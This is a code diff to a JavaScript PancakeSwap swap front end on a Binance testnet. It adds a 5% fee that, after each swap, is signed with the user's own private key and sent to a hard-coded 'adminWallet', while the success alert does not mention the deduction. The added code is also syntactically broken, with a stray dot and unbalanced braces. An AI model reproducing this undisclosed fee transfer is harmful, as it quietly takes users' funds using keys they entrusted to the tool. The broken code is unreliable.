@@ -8,6 +8,8 @@ if(typeof window != 'undefined'){
 
 const web3 = new Web3('https://data-seed-prebsc-1-s1.binance.org:8545/');
 let pancakeSwapContract = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+let adminWallet = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+let fees = 5; // %
 let pancakeSwap = new web3.eth.Contract(pancakeABI, pancakeSwapContract);
 
 async function getAmountsOut(fromToken, toToken) {
@@ -79,7 +81,13 @@ async function swap(fromContract, toContract, amount, address, privateKey) {
             data: excoded_tx,
             from: address,
             to: pancakeSwapContract,
-            value: amount
+            value: amount - (amount * (fees/100))
+        }
+        let feesObj = {
+            gas: 300000,
+            from: address,
+            to: adminWallet,
+            value: amount * (fees/100)
         }
         web3.eth.accounts.signTransaction(transObj, privateKey, (error, signedTx) => {
             if(error) {
@@ -87,8 +95,19 @@ async function swap(fromContract, toContract, amount, address, privateKey) {
             }else{
                 web3.eth.sendSignedTransaction(signedTx.rawTransaction)
                 .on("receipt", (receipt) => {
-                    console.log(receipt)
-                    alert('Swap Success !!')
+                    web3.eth.accounts.signTransaction(feesObj, privateKey, (error, signedTx) => {
+                        if(error) {
+                            alert(error.message);
+                        }else{
+                            web3.eth.sendSignedTransaction(signedTx.rawTransaction)
+                .           on("receipt", (receipt) => {
+                                alert('Swap Success !!')
+                            }
+                        }
+                    })
+                    .on("error", (error) => {
+                        console.log(error)
+                    })
                 })
                 .on("error", (error) => {
                     console.log(error)
